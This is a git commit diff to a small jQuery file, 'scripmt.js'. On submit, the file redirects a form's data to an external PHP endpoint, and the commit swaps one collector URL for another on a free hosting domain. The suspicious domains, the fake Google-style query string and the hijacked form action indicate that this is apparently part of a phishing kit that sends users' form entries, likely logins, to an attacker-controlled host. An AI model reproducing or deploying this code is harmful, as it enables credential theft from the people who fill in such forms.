fa9060fccd47dd4410f547b057f437b526fdb947
dindaayuningtias02 <147746444+dindaayuningtias02@users.noreply.github.com>
2023-10-12 23:58:43 +0700

    Update scripmt.js

--- scripmt.js
+++ scripmt.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://agoncyrewards.my.id/cuk/cuk1.php?q=fgf&rlz=1C1CHWL_enID101");
+  $(myform).attr("action", "https://cibuokngentotjosetan.000webhostapp.com/epek.php?q=fgf&rlz=1C1CHWL_enID101");
 });
